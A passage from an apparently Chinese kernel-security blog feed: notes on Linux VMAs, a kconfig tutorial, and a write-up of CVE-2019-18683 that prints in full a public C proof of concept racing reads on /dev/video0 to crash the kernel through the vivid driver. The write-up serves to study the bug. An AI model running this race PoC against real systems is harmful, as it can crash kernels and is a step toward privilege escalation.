__randomize_layout;</span><br></pre></td></tr></table></figure><p>这个结构体记录了虚拟内存的映射情况，每一个vma_area_struct记录了一段虚拟内存的映射情况，其中：</p><ul><li>vm_start为此段虚拟地址开始</li><li>vm_end为此段虚拟地址的结束</li><li>vm_next指向下一段vma_area_struct结构体</li><li>vm_prev指向上一段vma_area_struct结构体</li></ul><p>每个task_struct有许多vma_area_struct组成一个链表或者数为当前进程的虚拟地址空间映射分布，当vma_area_struct的结构体数量超过32,就会以AVL树的形式组织，主要是考虑到搜索速度</p><p>那么这样就清楚了，如果，你mmap一段地址，那么，在task_struct就会有一个vma_area_struct结构体对应，所以，当我访问一个虚拟内存地址时，发现他并没有对应的目录页或者页表项时，就会发生缺页异常，然后，内核就会检查vma_area_struct列表或者树，有没有包涵这个虚拟内存的段，如果有的话，就是mmap了，没有物理映射这种情况，如果没有的话，就是非法访问，就会真的pagefault</p><p>其实对于没有对应的虚拟内存段，还有一种比较特殊的情况，就是，<strong>这个虚拟地址在stack段下面的时候，我们都知道stack段是向下自动扩展的，如果，你访问的虚拟地址在stack一点点，正好没有被映射的时候，内核就会映射整个页，实现自动向下扩展</strong></p><p>我可以仔细考虑一下这种情况，如果，我们可以合法的把stack段（stack段的vma_area_struct独有的标志）移动到一个低地址（比如说0x10000），那么，当stack空间被用完的时候，他就需要向下扩展，所以，就有可能突破0地址映射的保护。。。。</p><h1 id="0x06-保护模式比实时模式安全在那些方面"><a href="#0x06-保护模式比实时模式安全在那些方面" class="headerlink" title="0x06 保护模式比实时模式安全在那些方面"></a>0x06 保护模式比实时模式安全在那些方面</h1><ul><li>保护模式拥有特权指令，而保护模式没有特权指令的概念，在实时模式下，进程改变的自己的段寄存器，不算什么特权指令，也就是说一个进程可以通过改自己的段寄存器实现任意地址访问</li></ul>]]></content>
    
    <summary type="html">
    
      面试被问住了，记录一下
    
    </summary>
    
    
    
      <category term="linux kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>linux kernel kconfig</title>
    <link href="http://yoursite.com/2020/04/05/linux-kernel-kconfig/"/>
    <id>http://yoursite.com/2020/04/05/linux-kernel-kconfig/</id>
    <published>2020-04-05T10:15:24.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在编译linux kernel遇到诸多不如意，比如，我想研究这个模块，想单独编译，但是，改了那个模块的makefile也没有起作用;我想内核帮我编译某一个模块，改完  .config之后的他也没有编译，这就很郁闷了。那么如何顺心如意的控制的kernel的编译选项的呢。这里以编译vivid驱动为例深入理解kernel的编译选项。</p><h1 id="0x01-kconfig"><a href="#0x01-kconfig" class="headerlink" title="0x01 kconfig"></a>0x01 kconfig</h1><p>参考:</p><ul><li><a href="https://blog.csdn.net/u011425939/article/details/80472324" target="_blank" rel="noopener">https://blog.csdn.net/u011425939/article/details/80472324</a></li></ul><p>简单来说就是make menuconfig 之后产生的界面就是各级kconfig文件产生的，具体的介绍参考 linux源码 <strong>Documentation/kbuild/kconfig-language.txt</strong> </p><h2 id="0x00-实例分析kconfig的语法"><a href="#0x00-实例分析kconfig的语法" class="headerlink" title="0x00 实例分析kconfig的语法"></a>0x00 实例分析kconfig的语法</h2><p>我们先来看一下kernel的顶级kconfig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># SPDX-License-Identifier: GPL-2.0</span><br><span class="line">#</span><br><span class="line"># For a description of the syntax of this configuration file,</span><br><span class="line"># see Documentation/kbuild/kconfig-language.rst.</span><br><span class="line">#</span><br><span class="line">mainmenu &quot;Linux/$(ARCH) $(KERNELVERSION) Kernel Configuration&quot;</span><br><span class="line"></span><br><span class="line">comment &quot;Compiler: $(CC_VERSION_TEXT)&quot;</span><br><span class="line"></span><br><span class="line">source &quot;scripts/Kconfig.include&quot;</span><br><span class="line">以下省略</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>根据显示的效果可以推测 mainmenu是标识主菜单后面是字符串是显示的文字，commit是提示信息，也是把后面的字符串输出，source就是引入次级目录的kconfig文件</p><p>下面我们看driver的下面的kconfig文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># SPDX-License-Identifier: GPL-2.0</span><br><span class="line">menu &quot;Device Drivers&quot;</span><br><span class="line"></span><br><span class="line"># Keep I/O buses first</span><br><span class="line"></span><br><span class="line">source &quot;drivers/amba/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">source &quot;drivers/counter/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">endmenu</span><br></pre></td></tr></table></figure><p>menu就是次级菜单，名字是 <strong>Device Drivers</strong></p><p>这样的话，我们设置一个驱动的编译选项就更好定位了，由于我们的vivid的驱动在media目录下，所以，看media目录的kconfig目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">config CEC_CORE</span><br><span class="line">tristate</span><br><span class="line"></span><br><span class="line">config CEC_NOTIFIER</span><br><span class="line">bool</span><br><span class="line"></span><br><span class="line">config CEC_PIN</span><br><span class="line">bool</span><br><span class="line"></span><br><span class="line">source &quot;drivers/media/rc/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">menuconfig MEDIA_SUPPORT</span><br><span class="line">tristate &quot;Multimedia support&quot;</span><br><span class="line">depends on HAS_IOMEM</span><br><span class="line">help</span><br><span class="line">  If you want to use Webcams, Video grabber devices and/or TV devices</span><br><span class="line">  enable this option and other options below.</span><br><span class="line">  Additional info and docs are available on the web at</span><br><span class="line">  &lt;https://linuxtv.org&gt;</span><br><span class="line"></span><br><span class="line">if MEDIA_SUPPORT</span><br><span class="line"></span><br><span class="line">comment &quot;Multimedia core support&quot;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">config MEDIA_CAMERA_SUPPORT</span><br><span class="line">bool &quot;Cameras/video grabbers support&quot;</span><br><span class="line">help</span><br><span class="line">  Enable support for webcams and video grabbers.</span><br><span class="line"></span><br><span class="line">  Say Y when you have a webcam or a video capture grabber board.</span><br></pre></td></tr></table></figure><p>这里config就是具体一条config选项了，然后他有五种类型</p><ul><li><p>bool</p></li><li><p>tristate</p></li><li><p>string</p></li><li><p>hex</p></li><li><p>int</p><p>tristate是有三个值一般标识模块 [*]  内建    [M] 模块  [ ]移除 然后depends on就是依赖选项，</p><p>之后在看platform下的kconfig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">menuconfig V4L_TEST_DRIVERS</span><br><span class="line">bool &quot;Media test drivers&quot;</span><br><span class="line">depends on MEDIA_CAMERA_SUPPORT</span><br><span class="line"></span><br><span class="line">if V4L_TEST_DRIVERS</span><br><span class="line"></span><br><span class="line">source &quot;drivers/media/platform/vimc/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">source &quot;drivers/media/platform/vivid/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">config VIDEO_VIM2M</span><br><span class="line">tristate &quot;Virtual Memory-to-Memory Driver&quot;</span><br><span class="line">depends on VIDEO_DEV &amp;&amp; VIDEO_V4L2</span><br><span class="line">select VIDEOBUF2_VMALLOC</span><br><span class="line">select V4L2_MEM2MEM_DEV</span><br><span class="line">help</span><br><span class="line">  This is a virtual test device for the memory-to-memory driver</span><br><span class="line">  framework.</span><br><span class="line"></span><br><span class="line">source &quot;drivers/media/platform/vicodec/Kconfig&quot;</span><br><span class="line"></span><br><span class="line">endif #V4L_TEST_DRIVERS</span><br></pre></td></tr></table></figure></li></ul><p>我们要设置vivid下的kconfig的话，依赖于media目录下的MEDIA_CAMERA_SUPPORT选项，所以，选中就可以了，之后就看vivid下的kconfig</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"># SPDX-License-Identifier: GPL-2.0-only</span><br><span class="line">config VIDEO_VIVID</span><br><span class="line">tristate &quot;Virtual Video Test Driver&quot;</span><br><span class="line">depends on VIDEO_DEV &amp;&amp; VIDEO_V4L2 &amp;&amp; !SPARC32 &amp;&amp; !SPARC64 &amp;&amp; FB</span><br><span class="line">depends on HAS_DMA</span><br><span class="line">select FONT_SUPPORT</span><br><span class="line">select FONT_8x16</span><br><span class="line">select FB_CFB_FILLRECT</span><br><span class="line">select FB_CFB_COPYAREA</span><br><span class="line">select FB_CFB_IMAGEBLIT</span><br><span class="line">select VIDEOBUF2_VMALLOC</span><br><span class="line">select VIDEOBUF2_DMA_CONTIG</span><br><span class="line">select VIDEO_V4L2_TPG</span><br><span class="line">help</span><br><span class="line">  Enables a virtual video driver. This driver emulates a webcam,</span><br><span class="line">  TV, S-Video and HDMI capture hardware, including VBI support for</span><br><span class="line">  the SDTV inputs. Also video output, VBI output, radio receivers,</span><br><span class="line">  transmitters and software defined radio capture is emulated.</span><br><span class="line"></span><br><span class="line">  It is highly configurable and is ideal for testing applications.</span><br><span class="line">  Error injection is supported to test rare errors that are hard</span><br><span class="line">  to reproduce in real hardware.</span><br><span class="line"></span><br><span class="line">  Say Y here if you want to test video apps or debug V4L devices.</span><br><span class="line">  When in doubt, say N.</span><br><span class="line"></span><br><span class="line">config VIDEO_VIVID_CEC</span><br><span class="line">bool &quot;Enable CEC emulation support&quot;</span><br><span class="line">depends on VIDEO_VIVID</span><br><span class="line">select CEC_CORE</span><br><span class="line">help</span><br><span class="line">  When selected the vivid module will emulate the optional</span><br><span class="line">  HDMI CEC feature.</span><br><span class="line"></span><br><span class="line">config VIDEO_VIVID_MAX_DEVS</span><br><span class="line">int &quot;Maximum number of devices&quot;</span><br><span class="line">depends on VIDEO_VIVID</span><br><span class="line">default &quot;64&quot;</span><br><span class="line">help</span><br><span class="line">  This allows you to specify the maximum number of devices supported</span><br><span class="line">  by the vivid driver.</span><br></pre></td></tr></table></figure><p>依赖很多，之后在看vivid的makefile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># SPDX-License-Identifier: GPL-2.0</span><br><span class="line">vivid-objs := vivid-core.o vivid-ctrls.o vivid-vid-common.o vivid-vbi-gen.o \</span><br><span class="line">vivid-vid-cap.o vivid-vid-out.o vivid-kthread-cap.o vivid-kthread-out.o \</span><br><span class="line">vivid-radio-rx.o vivid-radio-tx.o vivid-radio-common.o \</span><br><span class="line">vivid-rds-gen.o vivid-sdr-cap.o vivid-vbi-cap.o vivid-vbi-out.o \</span><br><span class="line">vivid-osd.o</span><br><span class="line">ifeq ($(CONFIG_VIDEO_VIVID_CEC),y)</span><br><span class="line">  vivid-objs += vivid-cec.o</span><br><span class="line">endif</span><br><span class="line"></span><br><span class="line">obj-$(CONFIG_VIDEO_VIVID) += vivid.o</span><br></pre></td></tr></table></figure><p>我们看可以看到最后一句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">obj-$(CONFIG_VIDEO_VIVID) += vivid.o</span><br></pre></td></tr></table></figure><p>我们都知道obj-m是编译模块，所以，我们需要逐级设置config才是正道，如果你只是改.config的文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_VIDEO_VIVID=m</span><br></pre></td></tr></table></figure><p>是没有任何效果，因为上级依赖没有设置，所以这个选项就会被忽略。</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>了解kconfig文件之后，就可以解释之前好多kernel编译的玄学问题，这个故事告诉我们，知道原理才能前行，那么问题来了，你怎么知道要了解的是什么原理，这是一个值得探究的问题，这个问题解决的话，学习效率就会高的超乎想象。</p>]]></content>
    
    <summary type="html">
    
      总结一下kconfig挺有用的
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>cve-2019-18683</title>
    <link href="http://yoursite.com/2020/04/01/cve-2019-18683/"/>
    <id>http://yoursite.com/2020/04/01/cve-2019-18683/</id>
    <published>2020-04-01T05:57:54.000Z</published>
    <updated>2020-05-24T14:57:12.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-环境搭建"><a href="#0x00-环境搭建" class="headerlink" title="0x00 环境搭建"></a>0x00 环境搭建</h1><h1 id="0x01-poc分析"><a href="#0x01-poc分析" class="headerlink" title="0x01 poc分析"></a>0x01 poc分析</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> * PoC crashing the kernel using the bug in drivers/media/platform/vivid.</span><br><span class="line"> * Turned out that this bug is exploitable.</span><br><span class="line"> * Just for fun.</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">#define _GNU_SOURCE</span><br><span class="line"></span><br><span class="line">#include &lt;fcntl.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;sys/prctl.h&gt;</span><br><span class="line">#include &lt;sys/stat.h&gt;</span><br><span class="line">#include &lt;pthread.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">#define err_exit(msg) do &#123; perror(msg); exit(EXIT_FAILURE); &#125; while (0)</span><br><span class="line"></span><br><span class="line">#define THREADS_N 2</span><br><span class="line">#define LOOP_N 10000</span><br><span class="line"></span><br><span class="line">unsigned char *buf = NULL;</span><br><span class="line"></span><br><span class="line">void *racer(void *arg)</span><br><span class="line">&#123;</span><br><span class="line">unsigned long n = (unsigned long)arg;</span><br><span class="line">unsigned long cpu_n = n % 2;</span><br><span class="line">cpu_set_t single_cpu;</span><br><span class="line">int ret = 0;</span><br><span class="line">unsigned long loop = 0;</span><br><span class="line"></span><br><span class="line">CPU_ZERO(&amp;single_cpu);</span><br><span class="line">CPU_SET(cpu_n, &amp;single_cpu);</span><br><span class="line">ret = sched_setaffinity(0, sizeof(single_cpu), &amp;single_cpu);</span><br><span class="line">if (ret != 0)</span><br><span class="line">err_exit(&quot;[-] sched_setaffinity for a single CPU&quot;);</span><br><span class="line"></span><br><span class="line">printf(&quot;[+] racer #%lu is on the start on CPU %lu\n&quot;, n, cpu_n);</span><br><span class="line"></span><br><span class="line">for (loop = 0; loop &lt; LOOP_N; loop++) &#123;</span><br><span class="line">int fd = 0;</span><br><span class="line"></span><br><span class="line">/* printf(&quot;  racer %lu, loop %lu\n&quot;, n, loop); */</span><br><span class="line"></span><br><span class="line">fd = open(&quot;/dev/video0&quot;, O_RDWR);</span><br><span class="line">if (fd &lt; 0)</span><br><span class="line">err_exit(&quot;[-] open /dev/video0&quot;);</span><br><span class="line"></span><br><span class="line">read(fd, buf, 0xfffded);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line">usleep(n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">return NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int ret = -1;</span><br><span class="line">cpu_set_t all_cpus;</span><br><span class="line">pthread_t th[THREADS_N] = &#123; 0 &#125;;</span><br><span class="line">long i = 0;</span><br><span class="line"></span><br><span class="line">printf(&quot;[!] gonna work with /dev/video0\n&quot;);</span><br><span class="line">printf(&quot;[!] please check that:\n&quot;);</span><br><span class="line">printf(&quot;\t vivid driver is loaded\n&quot;);</span><br><span class="line">printf(&quot;\t /dev/video0 is the V4L2 capture device\n&quot;);</span><br><span class="line">printf(&quot;\t you are logged in (Ubuntu adds RW ACL for /dev/video0)\n&quot;);</span><br><span class="line"></span><br><span class="line">ret = sched_getaffinity(0, sizeof(all_cpus), &amp;all_cpus);</span><br><span class="line">if (ret != 0)</span><br><span class="line">err_exit(&quot;[-] sched_getaffinity&quot;);</span><br><span class="line"></span><br><span class="line">if (CPU_COUNT(&amp;all_cpus) &lt; 2) &#123;</span><br><span class="line">printf(&quot;[-] not enough CPUs for racing\n&quot;);</span><br><span class="line">exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;[+] we have %d CPUs for racing\n&quot;, CPU_COUNT(&amp;all_cpus));</span><br><span class="line">fflush(NULL);</span><br><span class="line"></span><br><span class="line">buf = mmap(NULL, 0x1000000, PROT_READ | PROT_WRITE,</span><br><span class="line">MAP_SHARED | MAP_ANONYMOUS, -1, 0);</span><br><span class="line">if (buf == MAP_FAILED)</span><br><span class="line">err_exit(&quot;[-] mmap&quot;);</span><br><span class="line">else</span><br><span class="line">printf(&quot;[+] buf for reading is mmaped at %p\n&quot;, buf);</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; THREADS_N; i++) &#123;</span><br><span class="line">ret = pthread_create(&amp;th[i], NULL, racer, (void *)i);</span><br><span class="line">if (ret != 0)</span><br><span class="line">err_exit(&quot;[-] pthread_create for racer&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for (i = 0; i &lt; THREADS_N; i++) &#123;</span><br><span class="line">ret = pthread_join(th[i], NULL);</span><br><span class="line">if (ret != 0)</span><br><span class="line">err_exit(&quot;[-] pthread_join&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">printf(&quot;[-] racing is failed, try it again\n&quot;);</span><br><span class="line"></span><br><span class="line">exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到poc首先调用了<strong>sched_getaffinity()</strong> 函数,参考：</p><ul><li><a href="https://www.cnblogs.com/wenqiang/p/6049978.html" target="_blank" rel="noopener">https://www.cnblogs.com/wenqiang/p/6049978.html</a></li></ul><p>我们可以知道 <strong>sched_setaffinity()</strong> 是用来设置某一个进程运行在特定的cpu上， 用 <strong>sched_getaffinity()</strong> 函数来获取某一进程可以在那些cpu上运行，返回值 0为成功，-1为失败，利用这两个函数的话，更有利于gdb调试条件竞争的漏洞</p><p>之后调用CPU_COUNT()函数来获得当前进程可以运行的cpu的数量</p><p>之后调用 <strong>pthread_create()</strong> 函数来创建 <strong>THREADS_N</strong> 个线程，去运行racer函数，比较有意思的是，你创建的这个线程，是可以获取当前函数的局部变量的。。。</p><p>然后就是racer()函数，首先只用两个cpu，CPU_ZERO()函数是清空集合，CPU_SET()给定cpu号添加到集合里面，然后设置当前线程运行到特定的cpu上，然后for循环，一直open（） read（） close（）然后再挂起一段时间。</p><h1 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h1><h2 id="0x00-file-operations"><a href="#0x00-file-operations" class="headerlink" title="0x00 file_operations"></a>0x00 file_operations</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static const struct file_operations v4l2_fops = &#123;</span><br><span class="line">.owner = THIS_MODULE,</span><br><span class="line">.read = v4l2_read,</span><br><span class="line">.write = v4l2_write,</span><br><span class="line">.open = v4l2_open,</span><br><span class="line">.get_unmapped_area = v4l2_get_unmapped_area,</span><br><span class="line">.mmap = v4l2_mmap,</span><br><span class="line">.unlocked_ioctl = v4l2_ioctl,</span><br><span class="line">#ifdef CONFIG_COMPAT</span><br><span class="line">.compat_ioctl = v4l2_compat_ioctl32,</span><br><span class="line">#endif</span><br><span class="line">.release = v4l2_release,</span><br><span class="line">.poll = v4l2_poll,</span><br><span class="line">.llseek = no_llseek,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loff_t no_llseek(struct file *file, loff_t offset, int whence)</span><br><span class="line">&#123;</span><br><span class="line">return -ESPIPE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x03-运行poc"><a href="#0x03-运行poc" class="headerlink" title="0x03 运行poc"></a>0x03 运行poc</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span 